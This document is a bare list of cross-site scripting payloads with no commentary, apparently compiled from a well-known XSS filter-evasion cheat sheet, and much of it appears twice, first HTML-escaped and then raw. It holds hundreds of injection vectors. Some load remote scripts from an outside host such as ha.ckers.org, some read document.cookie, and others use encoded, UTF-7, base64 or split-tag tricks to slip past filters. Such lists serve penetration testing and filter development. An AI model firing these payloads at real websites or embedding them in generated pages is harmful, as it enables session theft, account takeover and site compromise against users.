&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
žscriptualert(EXSSE)ž/scriptu
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;!&#91;endif&#93;--&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
a=\"get\";
b=\"URL(\\"\";
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
eval(a+b+c+d);
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&lt;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
'';!--\"&lt;XSS&gt;=&{()}
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form><button formaction="javascript:alert(123)">crosssitespt
<frameset onload=alert(123)>
<!--<img src="--><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(123)//">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="javascript:alert(1)">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script src="#">{alert(1)}</script>;1
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%253cscript%253ealert(document.cookie)%253c/script%253e
“><s”%2b”cript>alert(document.cookie)</script>
“><ScRiPt>alert(document.cookie)</script>
“><<script>alert(document.cookie);//<</script>
foo<script>alert(document.cookie)</script>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
‘; alert(document.cookie); var foo=’
foo\’; alert(document.cookie);//’;
</script><script >alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
<BODY ONLOAD=alert(’XSS’)>
<script>alert(1)</script>
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
<script/src=data:,alert()>
<marquee/onstart=alert()>
<video/poster/onerror=alert()>
<isindex/autofocus/onfocus=alert()>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</script><script>alert('XSS');</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
veris-->group<svg/onload=alert(/XSS/)//
#"><img src=M onerror=alert('XSS');>
element[attribute='<img src=x onerror=alert('XSS');>
[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
%22;alert%28%27RVRSH3LL_XSS%29//
javascript:alert%281%29;
<w contenteditable id=x onfocus=alert()>
alert;pg("XSS")
<svg/onload=%26%23097lert%26lpar;1337)>
<script>for((i)in(self))eval(i)(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
<sCR<script>iPt>alert(1)</SCr</script>IPt>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
